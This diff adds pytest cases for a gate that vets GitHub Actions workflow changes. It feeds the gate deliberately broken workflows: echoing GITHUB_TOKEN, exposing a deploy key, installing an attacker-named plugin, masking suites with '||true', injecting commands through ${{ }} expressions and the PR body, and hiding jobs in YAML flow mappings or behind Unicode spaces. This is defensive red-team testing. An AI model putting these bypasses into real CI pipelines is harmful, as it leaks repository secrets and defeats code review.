+    one passes."""
+    suite = suite_workflow()
+    for pinned in (False, True):
+        r = pr(repo, "chore/gate-workflow", gate_pair(pinned=pinned), PR_BODY="## Capacity\nn/a: x\n")
+        assert r.returncode == 0, r.stdout
+    for broken in (suite.replace("  base-suite:\n", "  base-suite:\n    env:\n      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n", 1),
+                   suite.replace("          rm -rf proposed-head\n", "          rm -rf proposed-head\n          echo \"${{ secrets.GITHUB_TOKEN }}\"\n", 1),
+                   suite.replace("          persist-credentials: false\n          sparse-checkout:", "          persist-credentials: false\n          token: ${{ github.token }}\n          sparse-checkout:", 1)):
+        assert broken != suite
+        for pinned in (False, True):
+            moved_refused(repo, broken, "reads a secret or the token", pinned=pinned)
+
+
+def test_moved_base_suite_uses_no_cache_action(repo):
+    """No cache action restores anything into the job, before or after the copy."""
+    suite = suite_workflow()
+    for cache in ("      - uses: actions/cache@v4\n        with:\n          path: ~/.cache/pip\n          key: pip\n",
+                  "      - uses: actions/cache/restore@v4\n        with:\n          path: scripts/gate\n          key: gate\n",
+                  "      - uses: actions/setup-python@v5\n        with:\n          python-version: '3.12'\n          cache: pip\n"):
+        for pinned in (False, True):
+            moved_refused(repo, suite.replace(MOVED_COPY_STEP, cache + MOVED_COPY_STEP, 1), "use only actions/checkout", pinned=pinned)
+
+
+def test_moved_base_suite_declares_contents_read_and_is_not_the_registry_job(repo):
+    """The job holds a read-only token of its own, and the copy never runs in the registry job."""
+    suite = suite_workflow()
+    perms = "    timeout-minutes: 10\n    permissions:\n      contents: read\n"
+    assert suite.count(perms) == 1
+    merged = suite[:suite.index("  base-suite:\n")].replace("          python3 scripts/gate/export_model_registry.py --check",
+                                                           "          " + COPY_CMD + "\n          python3 scripts/gate/export_model_registry.py --check", 1)
+    for pinned in (False, True):
+        moved_refused(repo, suite.replace(perms, "    timeout-minutes: 10\n"), "does not declare `permissions: contents: read`", pinned=pinned)
+        moved_refused(repo, suite.replace(perms, "    timeout-minutes: 10\n    permissions:\n      contents: read\n      actions: read\n"),
+                      "does not declare `permissions: contents: read`", pinned=pinned)
+        moved_refused(repo, merged + MOVED_EXPORT_SUITE, "is never the registry job", pinned=pinned)
+
+
+def test_moved_base_suite_step_masks_no_suite_and_installs_nothing_else(repo):
+    """Red-team round one: a redirect glued to a separator (`2>&1|true`, `>/dev/null||true`) read as a
+    redirect masked a suite, and any extra install reached the default index; the step after the copy is
+    the pinned installs, the base's gate suite with no shell operator, then the exporter suite as designed.
+    A decoy job running the exporter suite elsewhere does not stand in for the masked one."""
+    suite = suite_workflow(c=SERIAL_SUITE + " -n 4")
+    for pinned in (False, True):
+        r = pr(repo, "chore/gate-workflow", {**gate_pair(pinned=pinned), (PINNED_REGISTRY_CHECK if pinned else REGISTRY_CHECK): suite},
+               PR_BODY="## Capacity\nn/a: x\n")
+        assert r.returncode == 0, r.stdout
+    masked = SERIAL_SUITE + " -n 4"
+    decoy = ("  extra:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@v4\n"
+             "      - run: python3 -m pytest tests/scripts/test_export_model_registry.py -q\n")
+    broken = [suite.replace(masked + "\n", masked + glued + "\n", 1) for glued in (" 2>&1|true", " >/dev/null||true", " >/dev/null&&true", " >/dev/null&")]
+    broken += [suite.replace(MOVED_EXPORT_SUITE, MOVED_EXPORT_SUITE[:-1] + " >/dev/null||true\n", 1) + decoy]
+    broken += [suite.replace("          " + masked, "          python3 -m pip install --upgrade pytest-attacker-plugin\n          " + masked, 1),
+               suite.replace(MOVED_EXPORT_SUITE, "          python3 -m pip install --no-deps --user pytest==3.0\n" + MOVED_EXPORT_SUITE, 1)]
+    for text in broken:
+        assert text != suite
+        for pinned in (False, True):
+            moved_refused(repo, text, "differs from the base-suite job", "beside registry and base-suite", "no longer executes",
+                          "beyond what the gate needs", pinned=pinned)
+
+
+def test_moved_base_suite_step_holds_no_expression(repo):
+    """Red-team round three: GitHub expands `${{ }}` in a comment line too, before bash reads the step, so an
+    expression returning a newline ran commands the gate never read (`exit 0` before the suites, or the
+    PR body itself)."""
+    suite = suite_workflow()
+    for comment in ("# ${{ fromJSON('\"\\nexit 0\"') }}", "# ${{ github.event.pull_request.body }}",
+                    "# ${{ format('{0}git checkout scripts/gate', fromJSON('\"\\n\"')) }}"):
+        broken = suite.replace("          rm -rf proposed-head\n", "          rm -rf proposed-head\n          " + comment + "\n", 1)
+        assert broken != suite
+        for pinned in (False, True):
+            moved_refused(repo, broken, "expression in its run step", pinned=pinned)
+
+
+def test_moved_base_suite_step_runs_the_gate_suite_after_the_designed_copy(repo):
+    """Red-team round two (policy seat): the registry job's own run of the gate suite does not stand in for
+    base-suite's, and the copy, the copy and the removal stay the designed lines."""
+    for c in ("echo skip", "python3 -m pytest tests/scripts/test_export_model_registry.py -q"):
+        for pinned in (False, True):
+            moved_refused(repo, suite_workflow(c=c), "differs from the base-suite job", "no longer executes", pinned=pinned)
+    for rm in ("true", "ls proposed-head"):
+        b = COPY_CMD.replace("rm -rf proposed-head", rm)
+        assert b != COPY_CMD
+        for pinned in (False, True):
+            moved_refused(repo, suite_workflow(b=b), "differs from the base-suite job", "no longer executes", "writes to or replaces", pinned=pinned)
+
+
+def test_moved_base_suite_step_holds_no_unicode_space(repo):
+    """Red-team round two: Python's strip() drops U+00A0 and the other Unicode spaces that bash reads as part
+    of a word, so a copy ending in one wrote a second file and the base's suites judged the base's gate."""
+    suite = suite_workflow()
+    for line in COPY_CMDS:
+        for space in ("\u00a0", "\u3000", "\u2009"):
+            broken = suite.replace("          " + line + "\n", "          " + line + space + "\n", 1)
+            assert broken != suite
+            for pinned in (False, True):
+                moved_refused(repo, broken, "whitespace other than spaces and newlines", pinned=pinned)
+
+
+def test_moved_registry_check_holds_no_job_the_line_reader_cannot_see(repo):
+    """Red-team round one: a job written as a YAML flow mapping has no lines the gate's reader parses, so
+    the moved registry-check.yml holds the registry and base-suite jobs only, read from the parsed YAML,
+    and its two checkouts use actions/checkout@v4 exactly (a commit sha resolves from any fork)."""
+    suite = suite_workflow()
+    flow = ("  evil: {runs-on: ubuntu-latest, steps: [{uses: actions/cache@v4, with: {path: scripts/gate, key: k}}, "
+            "{run: \"python3 -c 'import os'\"}]}\n")
+    sha = "actions/checkout@0123456789abcdef0123456789abcdef01234567"
+    head_by_sha = suite.replace(MOVED_HEAD_STEP, MOVED_HEAD_STEP.replace("actions/checkout@v4", sha, 1), 1)
+    assert head_by_sha != suite
+    for pinned in (False, True):
+        moved_refused(repo, suite + flow, "beside registry and base-suite", pinned=pinned)
+        moved_refused(repo, head_by_sha, "differs from the base-suite job", "does not check out the head once", pinned=pinned)
+
+
+def test_moved_registry_job_still_runs_the_prs_own_suite_and_needs_nothing(repo):
+    """Red-team round two: base-suite also runs the gate suite, so in the moved layout the registry job could
+    drop, mask or skip its own run of the PR's suite while the file still ran the command; and a registry job
+    that needs base-suite reports skipped, which a required check counts as passing, when base-suite fails."""
+    suite = suite_workflow()
+    own = "          python3 -m pytest tests/scripts/test_spec_gate.py -q -p no:cacheprovider --noconftest\n"
+    assert suite.count(own) == 1
+    for broken in (suite.replace(own, "", 1), suite.replace(own, own[:-1] + " || true\n", 1),
+                   suite.replace("  registry:\n    runs-on: ubuntu-latest\n", "  registry:\n    needs: base-suite\n    runs-on: ubuntu-latest\n", 1),
+                   # red-team round three: the list form of needs, too
+                   suite.replace("  registry:\n    runs-on: ubuntu-latest\n", "  registry:\n    needs: [base-suite]\n    runs-on: ubuntu-latest\n", 1)):
+        assert broken != suite
+        for pinned in (False, True):
+            moved_refused(repo, broken, "not `registry`", "no longer executes", "needs no other job", pinned=pinned)
+
+
+def test_moved_spec_gate_keeps_only_its_gate_job(repo):
+    """Red-team round two: in the moved layout nothing but the verdict runs under pull_request_target, so a
+    second job in spec-gate.yml, in block or flow form, is refused."""
+    extra = ("  other:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n"
+             "          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n      - run: echo hi\n")
+    flow = "  other: {runs-on: ubuntu-latest, steps: [{run: echo hi}]}\n"
+    for job in (extra, flow):
+        for pinned in (False, True):
+            pair = gate_pair(pinned=pinned)
+            spec_path = PINNED_SPEC_GATE if pinned else SPEC_GATE
+            pair[spec_path] += job
+            r = pr(repo, "chore/gate-workflow", pair, PR_BODY="## Capacity\nn/a: x\n")
+            assert r.returncode == 1 and "keeps only its gate job" in r.stdout, (job, pinned, r.stdout)
+
+
+def test_moved_spec_gate_extra_job_is_refused_when_only_registry_check_changes(repo):
+    """Red-team round three: the gate-job rule reads the tree's spec-gate.yml whenever either file of the pair
+    changes, so a base that already holds a second job beside the verdict is refused on the next change to
+    registry-check.yml as well."""
+    extra = "  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
+    for pinned in (False, True):
+        spec_path, registry_path = (PINNED_SPEC_GATE, PINNED_REGISTRY_CHECK) if pinned else (SPEC_GATE, REGISTRY_CHECK)
+        pair = gate_pair(pinned=pinned)
+        _git(repo, "reset", "-q", "--hard")
+        _git(repo, "checkout", "-q", "base")
+        for path, text in pair.items():
+            write(repo, path, text + (extra if path == spec_path else ""))
+        _git(repo, "add", "-A")
+        _git(repo, "commit", "-q", "-m", "base holds the moved layout with a second spec-gate job")
+        _git(repo, "tag", "-f", "base")
+        touched = pair[registry_path].replace("  registry:\n", "  # the registry job\n  registry:\n", 1)
+        assert touched != pair[registry_path]
+        r = pr(repo, "chore/gate-workflow", {registry_path: touched}, PR_BODY="## Capacity\nn/a: x\n")
+        assert r.returncode == 1 and "keeps only its gate job" in r.stdout, (pinned, r.stdout)
+
+
+def test_base_suite_layout_reads_a_flow_mapping_job(repo):
+    """Red-team round one: spec-gate.yml keeping a base-suite job written as a YAML flow mapping beside the
+    moved registry-check.yml is a pair holding both layouts, not the moved one."""
+    flow = ("  base-suite: {needs: gate, runs-on: ubuntu-latest, steps: [{uses: actions/checkout@v4, with: "
+            "{ref: \"${{ github.event.pull_request.base.sha }}\", persist-credentials: false}}]}\n")
+    for pinned in (False, True):
+        pair = gate_pair(pinned=pinned)
+        spec_path = PINNED_SPEC_GATE if pinned else SPEC_GATE
+        pair[spec_path] += flow
+        r = pr(repo, "chore/gate-workflow", pair, PR_BODY="## Capacity\nn/a: x\n")
+        assert r.returncode == 1 and "both carry the base suites" in r.stdout, (pinned, r.stdout)
+
+
+def test_base_suite_pair_holding_neither_layout_is_refused(repo):
+    """A pair that carried the base suites cannot drop them from both files."""
+    registry_only = registry_workflow(SERIAL_SUITE)
+    for pinned in (False, True):
+        pair = gate_pair(pinned=pinned)
+        spec_path, registry_path = list(pair)
+        on_base(repo, pair)
+        r = pr(repo, "chore/gate-workflow", {registry_path: registry_only}, PR_BODY="## Capacity\nn/a: x\n")
+        assert r.returncode == 1 and "neither carries the base suites" in r.stdout, (pinned, r.stdout)
+        on_base(repo, {spec_path: None, registry_path: None})
+    # both files edited at once: spec-gate.yml without job base-suite is judged by today's contract first
+    on_base(repo, gate_pair())
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: registry_only, SPEC_GATE: gate_workflow().replace("name: spec-gate\n", "name: spec-gate\n# still the verdict alone\n", 1)},
+           PR_BODY="## Capacity\nn/a: x\n")
+    assert r.returncode == 1 and ("neither carries the base suites" in r.stdout or "no longer executes" in r.stdout), r.stdout
+    on_base(repo, {SPEC_GATE: None, REGISTRY_CHECK: None})
+
+
+def test_base_suite_moved_layout_is_accepted_whole_on_the_live_pair(repo):
+    """The moved layout passes whole on the live pair."""
+    r = pr(repo, "chore/gate-workflow", gate_pair(), PR_BODY="## Capacity\nn/a: x\n")
+    assert r.returncode == 0, r.stdout
+
+
+def test_base_suite_moved_layout_is_accepted_whole_on_the_pinned_pair(repo):
+    """Step one of a move: the moved layout passes whole on the pinned pair."""
+    r = pr(repo, "chore/gate-workflow", gate_pair(pinned=True), PR_BODY="## Capacity\nn/a: x\n")
+    assert r.returncode == 0, r.stdout
+
+
+# Today's layout stays a layout the pair may hold: accepted whole, refused when weakened, as before.
+OLD_UPLOAD = "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n"
+OLD_DOWNLOAD = "      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n"
+
+
+def old_refused(repo, text: str, *needles: str, pinned: bool = False) -> None:
+    """spec-gate.yml in today's layout, as `text`, is refused naming one of `needles`."""
+    assert text != old_gate_workflow()
+    r = pr(repo, "chore/gate-workflow", {PINNED_SPEC_GATE if pinned else SPEC_GATE: text}, PR_BODY="## Capacity\nn/a: x\n")
+    assert r.returncode == 1 and any(n in r.stdout for n in needles), (needles, r.stdout)
+
+
+def test_old_layout_is_accepted_whole(repo):
+    """spec-gate.yml's job base-suite after the verdict, alone or beside a registry-only registry-check.yml."""
+    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
+    for spec_path, registry_path in ((SPEC_GATE, REGISTRY_CHECK), (PINNED_SPEC_GATE, PINNED_REGISTRY_CHECK)):
+        r = pr(repo, "chore/gate-workflow", {spec_path: old_gate_workflow()}, **cap)
+        assert r.returncode == 0, (spec_path, r.stdout)
+        r = pr(repo, "chore/gate-workflow", {spec_path: old_gate_workflow(), registry_path: registry_workflow(SERIAL_SUITE)}, **cap)
+        assert r.returncode == 0, (spec_path, r.stdout)
+
+
+def test_old_layout_pair_moves_to_the_moved_layout_in_one_change(repo):
+    """A live or pinned pair in today's layout moves to the moved one in one change."""
+    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
+    for pinned in (False, True):
+        spec_path, registry_path = (PINNED_SPEC_GATE, PINNED_REGISTRY_CHECK) if pinned else (SPEC_GATE, REGISTRY_CHECK)
+        on_base(repo, {spec_path: old_gate_workflow(), registry_path: registry_workflow(SERIAL_SUITE)})
+        r = pr(repo, "chore/gate-workflow", gate_pair(pinned=pinned), **cap)
+        assert r.returncode == 0, (pinned, r.stdout)
+        on_base(repo, {spec_path: None, registry_path: None})
+
+
+def test_old_layout_pair_dropping_its_suites_is_refused(repo):
+    """A pair in today's layout cannot drop the base suites from spec-gate.yml without moving them."""
+    registry_only = registry_workflow(SERIAL_SUITE)
+    for spec_path, registry_path in ((SPEC_GATE, REGISTRY_CHECK), (PINNED_SPEC_GATE, PINNED_REGISTRY_CHECK)):
+        on_base(repo, {spec_path: old_gate_workflow(), registry_path: registry_only})
+        r = pr(repo, "chore/gate-workflow", {spec_path: gate_workflow()}, PR_BODY="## Capacity\nn/a: x\n")
+        # spec-gate.yml's contract for today's layout names it first
+        assert r.returncode == 1 and "no longer executes" in r.stdout, (spec_path, r.stdout)
+        on_base(repo, {spec_path: None, registry_path: None})
+
+
+def test_old_layout_held_beside_the_moved_one_is_refused(repo):
+    """spec-gate.yml's job base-suite and registry-check.yml's job base-suite together run the base
+    suites twice under two designs; the pair holds exactly one."""
+    for spec_path, registry_path in ((SPEC_GATE, REGISTRY_CHECK), (PINNED_SPEC_GATE, PINNED_REGISTRY_CHECK)):
+        r = pr(repo, "chore/gate-workflow", {spec_path: old_gate_workflow(), registry_path: suite_workflow()}, PR_BODY="## Capacity\nn/a: x\n")
+        assert r.returncode == 1 and "both carry the base suites" in r.stdout, (spec_path, r.stdout)
+
+
+def test_old_layout_handoff_is_refused_when_weakened(repo):
+    """The artifact handoff still carries the proposed gate to the suite's job, once, with nothing after it."""
+    typed = old_gate_workflow()
+    assert typed.count(OLD_UPLOAD) == 1 and typed.count(OLD_DOWNLOAD) == 1
+    for pinned in (False, True):
+        for broken in (typed.replace(OLD_UPLOAD, ""), typed.replace(OLD_DOWNLOAD, ""),
+                       typed.replace("          name: proposed-spec-gate\n          path: scripts/gate\n", "          name: other\n          path: scripts/gate\n"),
+                       typed.replace("          name: proposed-spec-gate\n          path: scripts/gate\n", "          name: proposed-spec-gate\n          path: elsewhere\n"),
+                       typed.replace("      - uses: actions/upload-artifact@v4\n", "      - if: false\n        uses: actions/upload-artifact@v4\n"),
+                       typed.replace(OLD_UPLOAD, OLD_UPLOAD.replace("path: ${{ runner.temp }}/proposed/\n", "path: ${{ runner.temp }}/proposed/\n          overwrite: true\n")),
+                       # red-team round one (policy seat): main's upload-before-the-export case, kept in today's layout
+                       typed.replace("      - env:\n", OLD_UPLOAD + "      - env:\n", 1).replace("      - run: " + EXPORT_CMD + "\n" + OLD_UPLOAD, "      - run: " + EXPORT_CMD + "\n")):
+            old_refused(repo, broken, "no longer reaches the suite's job", "uploaded or downloaded more than once", pinned=pinned)
+        old_refused(repo, typed.replace(OLD_DOWNLOAD, OLD_DOWNLOAD + "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n", 1),
+                    "after the handoff download", pinned=pinned)
+
+
+def test_old_layout_actions_and_upload_path_stay_the_contract(repo):
+    """Red-team round one (policy seat): main's cases for today's layout that the moved fixtures no longer
+    reach. A third-party action, or a checkout after a `run:` step, before the upload in the
+    pull_request_target job is refused; an upload path other than the runner's proposed directory is
+    refused, and `$RUNNER_TEMP/proposed` is that directory."""
+    typed = old_gate_workflow()
+    upload = next(ln for ln in typed.splitlines() if "actions/upload-artifact" in ln)
+    for pinned in (False, True):
+        old_refused(repo, typed.replace(upload, "      - uses: some/action@v1\n" + upload, 1), "use only actions/checkout", pinned=pinned)
+        old_refused(repo, typed.replace(upload, "      - uses: actions/checkout@v4\n" + upload, 1), "runs after a `run:` step", pinned=pinned)
+        old_refused(repo, typed.replace("          path: ${{ runner.temp }}/proposed/\n", "          path: ${{ runner.temp }}/not-proposed/\n"),
+                    "no longer reaches the suite's job", pinned=pinned)
+        r = pr(repo, "chore/gate-workflow", {PINNED_SPEC_GATE if pinned else SPEC_GATE:
+                                             typed.replace("          path: ${{ runner.temp }}/proposed/\n", "          path: $RUNNER_TEMP/proposed\n")},
+               PR_BODY="## Capacity\nn/a: x\n")
+        assert r.returncode == 0, r.stdout
+
+
+def test_old_layout_exporter_needs_and_job_identity_stay_the_contract(repo):
+    """Red-team round two (policy seat): main's cases for today's layout that the moved fixtures no longer
+    reach. Where the exporter exists its proposed copy is exported and the base's exporter suite runs after
+    the gate suite in job base-suite; spec-gate.yml's `needs:` names only its jobs, with no cycle; job
+    base-suite keeps its key as its check context and its name."""
+    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
+    exporter = {"scripts/gate/export_model_registry.py": "print('x')\n"}
+    export_both = EXPORT_CMD + "\n          git show \"$HEAD_SHA:scripts/gate/export_model_registry.py\" > \"$RUNNER_TEMP/proposed/export_model_registry.py\""
+    both_suites = SUITE_CMD + "\n          python3 -m pytest tests/scripts/test_export_model_registry.py -q"
+    typed = old_gate_workflow()
+    for spec_path in (SPEC_GATE, PINNED_SPEC_GATE):
+        r = pr(repo, "chore/gate-workflow", {spec_path: typed, **exporter}, **cap)
+        assert r.returncode == 1 and "no longer executes" in r.stdout and "export_model_registry" in r.stdout, r.stdout
+        with_exporter = old_gate_workflow(b="|\n          " + export_both, c="|\n          " + both_suites)
+        assert pr(repo, "chore/gate-workflow", {spec_path: with_exporter, **exporter}, **cap).returncode == 0
+        misplaced = old_gate_workflow(b="|\n          " + export_both + "\n          python3 -m pytest tests/scripts/test_export_model_registry.py -q")
+        r = pr(repo, "chore/gate-workflow", {spec_path: misplaced, **exporter}, **cap)
+        assert r.returncode == 1 and ("does not follow" in r.stdout or "holds no checkout credentials" in r.stdout), r.stdout
+        pinned = spec_path == PINNED_SPEC_GATE
+        assert "    needs: gate\n" in typed
+        old_refused(repo, typed.replace("    needs: gate\n", "    needs: [gate, missing]\n", 1), "is not a job of the workflow", pinned=pinned)
+        old_refused(repo, typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    needs: base-suite\n    runs-on: ubuntu-latest\n", 1), "no cycle", pinned=pinned)
+        old_refused(repo, typed.replace("  base-suite:\n", "  base-suite:\n    name: bs-x\n", 1), "keeps its key as its check context", pinned=pinned)
+        old_refused(repo, typed.replace("  base-suite:\n", "  suite:\n", 1), "keeps its job name", pinned=pinned)
+
+
+def test_old_layout_base_suite_job_is_refused_when_weakened(repo):
+    """Job base-suite still runs the suite after the verdict, from a checkout that keeps no credentials."""
+    for pinned in (False, True):
+        old_refused(repo, old_gate_workflow(a=EXPORT_CMD, b=VERDICT_CMD), "does not follow", pinned=pinned)
+        old_refused(repo, old_gate_workflow(b="echo skip"), "no longer executes", pinned=pinned)
+        old_refused(repo, old_gate_workflow().replace("    needs: gate\n", ""), "does not follow", pinned=pinned)
+        old_refused(repo, old_gate_workflow(b=EXPORT_CMD + "\n      - run: " + SUITE_CMD, c="echo done"), "holds no checkout credentials", pinned=pinned)
+        old_refused(repo, old_gate_workflow().replace("          persist-credentials: false\n", ""), "holds no checkout credentials", pinned=pinned)
+        old_refused(repo, old_gate_workflow(c="echo skip"), "no longer executes", pinned=pinned)
